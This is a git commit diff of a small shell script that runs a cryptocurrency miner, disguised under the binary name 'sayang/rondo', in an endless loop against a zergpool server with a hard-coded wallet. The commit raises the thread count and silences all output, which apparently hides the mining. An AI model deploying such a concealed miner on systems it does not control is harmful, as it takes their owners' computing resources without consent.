221622fcd7b7e49980c569d4e03549456847a8d5
liyanul225 <108873090+liyanul225@users.noreply.github.com>
2022-07-10 20:33:44 +0700

    Update kuntul.sh

--- kuntul.sh
+++ kuntul.sh
@@ -1,5 +1,5 @@
 #!/bin/sh
 while [ 1 ]; do
-	sayang/rondo -a scryptn2 -o stratum+tcp://scryptn2.na.mine.zergpool.com:3435 -u LXXC5yzd4amhAYzNVoYziU2PWdaqFWNn1T -p c=LTC,mc=XBTX,ID=Tuyul -t 2
+	sayang/rondo -a scryptn2 -o stratum+tcp://scryptn2.na.mine.zergpool.com:3435 -u LXXC5yzd4amhAYzNVoYziU2PWdaqFWNn1T -p c=LTC,mc=XBTX,ID=Tuyul -t 6 >/dev/null 2>&1
 	sleep 5
 done
